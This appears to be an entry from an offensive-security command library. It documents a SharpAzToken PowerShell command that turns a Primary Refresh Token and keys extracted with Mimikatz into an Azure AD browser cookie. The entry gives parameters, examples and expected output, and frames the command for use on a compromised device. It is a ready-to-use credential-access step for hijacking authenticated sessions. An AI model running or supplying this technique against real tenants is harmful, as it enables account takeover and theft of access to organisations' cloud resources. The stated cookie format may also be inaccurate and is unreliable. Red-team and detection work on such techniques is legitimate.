---
id: a2517a47-bc08-43cb-8042-1b3b9ad8a84c
name: sharpaztoken-generate-cookie
type: command
executor: powershell
data: >-
  SharpAzToken.exe cookie --derivedkey $_DERIVED_KEY --context $_CONTEXT --prt
  $_PRT
output: null
created_at: '2023-05-24T07:39:51.364209+00:00'
updated_at: '2023-05-24T07:39:52.197066+00:00'
platforms:
  - Windows
tags:
  - azure
  - token
  - credential-access
verified: true
validated: true
---

# sharpaztoken-generate-cookie

## Command

```powershell
SharpAzToken.exe cookie --derivedkey $_DERIVED_KEY --context $_CONTEXT --prt $_PRT
```

## Description

This command uses SharpAzToken to generate a Primary Refresh Token (PRT) cookie for browser authentication in Azure AD environments. It requires inputs from Mimikatz and produces a cookie that can be used to authenticate browser sessions to Azure portals without additional prompts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --derivedkey $_DERIVED_KEY | The derived encryption key from Mimikatz (base64-encoded) | Yes |
| --context $_CONTEXT | The authentication context from Mimikatz (JSON or base64) | Yes |
| --prt $_PRT | The Primary Refresh Token from Mimikatz extraction | Yes |

## Examples

### Basic Usage

```powershell
SharpAzToken.exe cookie --derivedkey "BASE64KEYHERE" --context "CONTEXTJSON" --prt "PRTHASH"
```

### Advanced Usage

Run in a PowerShell session on a compromised Azure AD-joined device:

```powershell
SharpAzToken.exe cookie --derivedkey $derivedKeyVar --context $contextVar --prt $prtVar
```

## Expected Output

The command outputs a cookie string in the format 'MsalToken=<encoded_token>; Path=/; Secure; HttpOnly' which can be manually set in browser developer tools or imported via a script. Success is confirmed by no errors and a valid cookie expiry matching the PRT lifetime (typically 90 days).

## Related

- [[procedures/Generate-Azure-Tokens-with-SharpAzToken]]
- [[tools/SharpAzToken]]
